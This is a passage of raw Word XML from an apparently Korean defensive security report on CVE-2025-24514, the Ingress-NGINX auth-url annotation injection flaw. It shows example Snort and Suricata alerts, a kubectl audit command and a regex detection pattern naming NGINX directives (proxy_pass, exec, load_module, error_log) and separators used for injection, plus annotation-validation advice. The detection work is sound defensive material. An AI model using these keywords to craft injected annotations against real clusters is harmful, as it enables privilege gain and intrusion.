          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 활성화</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Snort --enable-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>mpls</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t> 옵션으로 병렬 처리 성능 향상</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52682EFA" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">5. </w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>탐지</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>로그</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>분석</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>예시</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CFB8077" w14:textId="4246B32A" w:rsidR="00C748E6" w:rsidRPr="00C748E6" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">Suricata </w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이벤트</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2D543C95" wp14:editId="6FAB0E2E">
                <wp:extent cx="5497033" cy="1573619"/>
                <wp:effectExtent l="0" t="0" r="27940" b="26670"/>
                <wp:docPr id="30775528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033" cy="1573619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4FBB7" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                            <w:pPr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text</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="73A9559F" w14:textId="7C065A91" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                            <w:pP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</w:pPr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[**] [1:202524514] CVE-2025-24514: Ingress-NGINX auth-</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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url</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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 Injection Attempt [**]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[Priority: 1]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[</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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AppLayer</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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 Proto: HTTP]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{HTTP} 192.168.1.100:51234 -&gt; 10.0.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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>2</w:t>
                            </w:r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.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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>1</w:t>
                            </w:r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5:6443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543C95" id="_x0000_s1052" style="width:432.85pt;height:1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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="0834FBB7" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                      <w:pPr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text</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="73A9559F" w14:textId="7C065A91" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr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[**] [1:202524514] CVE-2025-24514: Ingress-NGINX auth-</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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url</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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 Injection Attempt [**]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[Priority: 1] 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[</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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AppLayer</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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 Proto: HTTP] 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{HTTP} 192.168.1.100:51234 -&gt; 10.0.</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>2</w:t>
                      </w:r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.</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>1</w:t>
                      </w:r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5:6443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70A0C9B" w14:textId="4819AD4E" w:rsidR="00C748E6" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">Snort </w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이벤트</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1C1A7084" wp14:editId="550D9959">
                <wp:extent cx="5486400" cy="1570621"/>
                <wp:effectExtent l="0" t="0" r="19050" b="10795"/>
                <wp:docPr id="149151319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570621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CBECB" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                            <w:pPr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text</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0C7037CF" w14:textId="1BFA9D2C" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                            <w:pP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</w:pPr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[**] [202524514] CVE-2025-24514: Kubernetes Ingress-NGINX Exploit [**]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[Classification: Attempted Administrator Privilege Gain]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[Priority: 1]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0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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>6</w:t>
                            </w:r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/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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>11</w:t>
                            </w:r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-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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>22</w:t>
                            </w:r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:22:15.658734 192.168.1.100:51234 -&gt; 10.0.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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>2</w:t>
                            </w:r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.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lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>1</w:t>
                            </w:r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5:6443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1A7084" id="_x0000_s1053" style="width:6in;height:1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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="433CBECB" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                      <w:pPr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text</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0C7037CF" w14:textId="1BFA9D2C" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr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[**] [202524514] CVE-2025-24514: Kubernetes Ingress-NGINX Exploit [**]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[Classification: Attempted Administrator Privilege Gain] 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[Priority: 1] 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0</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>6</w:t>
                      </w:r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/</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>11</w:t>
                      </w:r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-</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>22</w:t>
                      </w:r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:22:15.658734 192.168.1.100:51234 -&gt; 10.0.</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>2</w:t>
                      </w:r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.</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>1</w:t>
                      </w:r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5:6443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FA1BB28" w14:textId="5DE068E0" w:rsidR="000D7E05" w:rsidRPr="000D7E05" w:rsidRDefault="000D7E05" w:rsidP="000D7E05">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D7E05">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">8.2 </w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>비정상</w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ingress annotation </w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>탐지</w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308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E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>방법</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="792650EC" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>1. 자동화된 Ingress 리소스 감사</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DFB70DC" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="99"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">모든 Ingress 리소스의 annotation 필드를 주기적으로 스캔하여, 허용되지 않은 값(예: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>개행</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 문자, 세미콜론, NGINX directive 등)이 포함된 경우 경고를 발생시킵니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42257CF7" w14:textId="209A24CD" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="99"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>예시</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3337EFCA" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="99"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>kubectl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> get ingress --all-namespaces -o </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>yaml</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> | grep 'nginx.ingress.kubernetes.io/auth-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F6ECFB" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="99"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>정규표현식으로 [\n;]|(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>proxy_pass|exec|load_module|error_log</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>) 등 위험 키워드 탐지</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32EE0F6F" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>2. annotation validation 기능 활성화</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D2DC47" w14:textId="487D9616" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="100"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">Ingress-NGINX Controller의 --enable-annotation-validation 플래그를 활성화하고, 위험 등급 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>임계값</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">(annotations-risk-level: High)을 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>ConfigMap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>에 설정하여 고위험 annotation 입력을 차단할 수 있습니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41599085" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="100"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이 기능은 취약점 악용을 사전에 차단하는 효과적인 방법입니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="240A1A8E" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
